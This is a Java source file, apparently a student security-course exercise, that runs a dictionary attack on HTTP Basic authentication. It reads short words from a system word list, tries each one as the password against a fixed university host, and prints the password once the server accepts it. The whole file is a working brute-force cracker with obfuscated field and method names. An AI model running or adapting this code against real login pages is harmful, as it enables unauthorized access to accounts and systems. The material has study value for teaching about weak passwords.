import java.net.URL;
import java.net.HttpURLConnection;
import java.net.PasswordAuthentication;
import java.net.Authenticator;
import java.io.IOException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.util.Vector;
public class Dictionary {
    private boolean c;
    int a;
    Vector b;
    Dictionary() {
        this.c = false;
        this.b = new Vector();
        this.a = 0;
        this.b();
        this.a();
    }
    private void a() {
        while ( this.a < this.b.size() ) {
            this.c = this.c();
            if ( this.c ) {
                System.out.print ( "The password is: " );
                System.out.println ( this.b.elementAt ( this.a - 1 ) );
                this.a = this.b.size();
            }
        }
    }
    private void b() {
        try {
            BufferedReader bufferedReader;
            for ( String s = ( bufferedReader = new BufferedReader ( new FileReader ( "/usr/share/lib/dict/words" ) ) ).readLine(); s != null; s = bufferedReader.readLine() ) {
                if ( s.length() <= 3 ) {
                    this.b.addElement ( s );
                }
            }
        } catch ( IOException ex ) {}
    }
    private boolean c() {
        Authenticator.setDefault ( new Dictionary$MyAuthenticator ( this ) );
        try {
            final HttpURLConnection httpURLConnection;
            ( httpURLConnection = ( HttpURLConnection ) new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).openConnection() ).connect();
            if ( httpURLConnection.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( IOException ex ) {}
        return false;
    }
    public static void main ( final String[] array ) {
        new Dictionary();
    }
}
class Dictionary$MyAuthenticator extends Authenticator {
    private   Dictionary a;
    Dictionary$MyAuthenticator ( final Dictionary a ) {
        this.a = a;
    }
    @Override
    protected PasswordAuthentication getPasswordAuthentication() {
        final String s = "";
        final String s2 = this.a.b.elementAt ( this.a.a );
        ++this.a.a;
        return new PasswordAuthentication ( s, s2.toCharArray() );
    }
}
